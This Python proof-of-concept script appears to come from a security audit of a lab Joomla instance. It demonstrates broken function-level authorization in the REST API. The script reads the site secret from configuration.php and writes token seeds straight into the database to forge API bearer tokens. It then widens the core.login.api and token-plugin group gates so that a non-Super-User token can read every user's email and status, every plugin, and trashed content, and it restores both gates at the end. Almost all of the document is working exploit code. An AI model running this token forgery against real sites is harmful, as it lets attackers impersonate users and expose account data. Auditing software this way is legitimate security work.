#!/usr/bin/env python3
"""
VULN-008 — API authorization is structurally coarser than the UI
           (no per-component core.manage gate on the API path; no state filter on reads)

Target files:
  - libraries/src/Dispatcher/ApiDispatcher.php:46-62  (dispatch() never calls checkAccess())
  - libraries/src/Dispatcher/ComponentDispatcher.php:98-104 (core.manage gate is admin-client-only)
  - libraries/src/MVC/Controller/ApiController.php:146,201 (displayItem/displayList: no authorise())
OWASP API5 (Broken Function Level Authorization) / CWE-285; API3 (excessive data exposure).

The REST API has NO per-component authorization gate, and list/item reads apply NO
publication-state filter. At the secure baseline the API is reachable only by Super
Users (core.login.api -> group 8 only), so this is latent/INTENDED. But if an
operator grants core.login.api to a non-Super-User group (a documented way to wire
up an integration), that group reads EVERY component's admin data — all users
(emails/block/lastvisit), all plugins/extensions/templates, every content state —
strictly more than it can see in any UI channel.

This exploit mints Joomla API tokens directly (base64("<algo>:<uid>:<HMAC>"), HMAC
over the user's joomlatoken.token seed keyed by the site secret) and proves:
  A. BASELINE: a group-7 (Administrator, non-SU) token is REJECTED by the API
     (core.login.api is SU-only) — the INTENDED posture. The SU token meanwhile
     reads list endpoints and accepts filter[state]=-2 (trashed) with no restriction.
  B. WIDENED CONFIG: after granting core.login.api to group 7 (the finding's
     non-default operator action), the SAME group-7 token now reads /users,
     /plugins, /templates, /content/articles across components with no per-component
     gate => BFLA / excessive data exposure. The grant is reverted afterwards.

Verdict: CONFIRMED (widened-config BFLA demonstrated); baseline is INTENDED (SU-only).
"""
import os
import sys
import json
import base64
import hashlib
import hmac
import secrets
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import joomla_common as J
import requests

BASE_URL = J.BASE_URL
API = f"{BASE_URL}/api/index.php/v1"


def site_secret():
    out = J.docker_exec(["sh", "-c",
                         "grep -oE \"secret = '[^']*'\" /var/www/html/configuration.php"])
    return out.split("'")[1]


def mint_token(uid, secret, algo="sha256"):
    """Set a joomlatoken seed for the user and return the Bearer token string."""
    raw = secrets.token_bytes(32)
    stored = base64.b64encode(raw).decode()           # profile_value = base64(referenceTokenData)
    J.db_query(f"DELETE FROM jos_user_profiles WHERE user_id={uid} "
               f"AND profile_key IN ('joomlatoken.token','joomlatoken.enabled');")
    J.db_query(f"INSERT INTO jos_user_profiles (user_id,profile_key,profile_value,ordering) "
               f"VALUES ({uid},'joomlatoken.token','{stored}',0),({uid},'joomlatoken.enabled','1',0);")
    mac = hmac.new(secret.encode(), raw, hashlib.sha256).hexdigest()
    return base64.b64encode(f"{algo}:{uid}:{mac}".encode()).decode()


def api_get(path, token):
    r = requests.get(f"{API}{path}",
                     headers={"Authorization": f"Bearer {token}",
                              "Accept": "application/vnd.api+json"}, timeout=30)
    try:
        n = len(r.json().get("data", []))
    except Exception:
        n = None
    return r.status_code, n, r.text


def get_root_rules():
    return J.db_query("SELECT rules FROM jos_assets WHERE id=1;").strip()


def set_core_login_api_group(enabled_group7: bool):
    rules = json.loads(get_root_rules())
    cla = rules.get("core.login.api", {})
    if enabled_group7:
        cla["7"] = 1
    else:
        cla.pop("7", None)
    rules["core.login.api"] = cla
    newrules = json.dumps(rules).replace("'", "''")
    J.db_query(f"UPDATE jos_assets SET rules='{newrules}' WHERE id=1;")


def set_token_allowed_groups(group7: bool):
    """Widen (or restore) the user/token plugin's allowedUserGroups (plg_user_token).
    Default is absent -> getAllowedUserGroups() falls back to [8] (SU-only), a second gate."""
    raw = J.db_query("SELECT params FROM jos_extensions WHERE element='token' AND folder='user';").strip()
    params = json.loads(raw) if raw.startswith("{") else {}
    if group7:
        params["allowedUserGroups"] = ["7", "8"]
    else:
        params.pop("allowedUserGroups", None)   # back to default (absent -> [8])
    newp = json.dumps(params).replace("'", "''")
    J.db_query(f"UPDATE jos_extensions SET params='{newp}' WHERE element='token' AND folder='user';")


def main():
    J.banner("VULN-008", "API authorization structurally coarser than the UI")
    J.log("INFO", "ApiDispatcher never calls checkAccess(); reads apply no per-component gate / state filter")
    secret = site_secret()

    admin = J.admin_session()

    # ---- A. BASELINE: SU token works; a group-7 token is rejected -----------
    J.log("STEP", "BASELINE — mint a Super-User (admin) API token and read list endpoints")
    su_token = mint_token(52, secret)
    code_u, n_u, _ = api_get("/users", su_token)
    code_s, n_s, _ = api_get("/content/articles?filter[state]=-2", su_token)  # trashed
    J.log("INFO", f"  SU /users -> HTTP {code_u} (data items: {n_u}); "
                  f"/content/articles?filter[state]=-2 -> HTTP {code_s} (no state restriction enforced)")
    if code_u == 200:
        J.log("PROOF", "SU token reads the API and the admin list model accepts filter[state]=-2 "
                        "(trashed) with no publication-state restriction")

    J.log("STEP", "BASELINE — create a non-SU Administrator (group 7) and mint its token")
    user, pw, uid7, _ = J.create_backend_user(admin, group_id=7, prefix="apiadm")
    g7_token = mint_token(uid7, secret)
    code_b, _, body_b = api_get("/users", g7_token)
    J.log("INFO", f"  group-7 token /users (baseline, core.login.api SU-only) -> HTTP {code_b}")
    baseline_denied = code_b in (401, 403)
    if baseline_denied:
        J.log("PROOF", "group-7 token REJECTED at baseline -> API is Super-User-only = the INTENDED posture")

    # ---- B. WIDENED CONFIG: grant core.login.api to group 7 -> BFLA ---------
    J.log("STEP", "WIDENED CONFIG — operator grants API access to group 7 (the finding's non-default action)")
    J.log("INFO", "two gates must be widened: token-plugin allowedUserGroups (default [8]) AND core.login.api (default group 8)")
    bfla = False
    try:
        set_token_allowed_groups(True)      # gate 1: token plugin allows group 7
        set_core_login_api_group(True)      # gate 2: core.login.api granted to group 7
        J.log("SETUP", "allowedUserGroups += group 7 AND core.login.api granted to group 7 (both reverted later)")
        reads = {}
        for path in ["/users", "/plugins", "/content/articles?filter[state]=-2"]:
            c, n, _ = api_get(path, g7_token)
            reads[path] = (c, n)
            J.log("INFO", f"  group-7 token {path} -> HTTP {c} (data items: {n})")
        # BFLA = the group-7 token can now read cross-component admin data (users+plugins) it has no UI ACL for
        bfla = (reads["/users"][0] == 200 and reads["/plugins"][0] == 200)
        if bfla:
            J.log("PROOF", "the same group-7 token now reads /users (all accounts: email/block/lastvisit) AND "
                            "/plugins (every plugin + state) with NO per-component core.manage gate -> broken "
                            "function-level authorization / excessive data exposure")
    finally:
        set_core_login_api_group(False)
        set_token_allowed_groups(False)
        after = json.loads(get_root_rules())
        still_has_7 = "7" in after.get("core.login.api", {})
        J.log("SETUP", f"both gates reverted; core.login.api still grants group 7: {still_has_7}")

    print()
    if baseline_denied and bfla:
        J.log("OK", "baseline is SU-only (INTENDED); granting core.login.api to a non-SU group yields "
                    "cross-component read access with no per-component gate (BFLA)")
        J.verdict("VULN-008", "CONFIRMED",
                  "widened-config BFLA: non-SU group reads every component via the API (no per-component gate); baseline INTENDED (SU-only)")
        sys.exit(0)
    elif bfla:
        J.log("OK", "BFLA demonstrated under widened config")
        J.verdict("VULN-008", "CONFIRMED", "non-SU group reads all components via API once granted core.login.api")
        sys.exit(0)
    else:
        J.log("FAIL", "could not demonstrate the coarse-authz exposure")
        J.verdict("VULN-008", "FAILED", "exposure not reproduced")
        sys.exit(1)


if __name__ == "__main__":
    main()
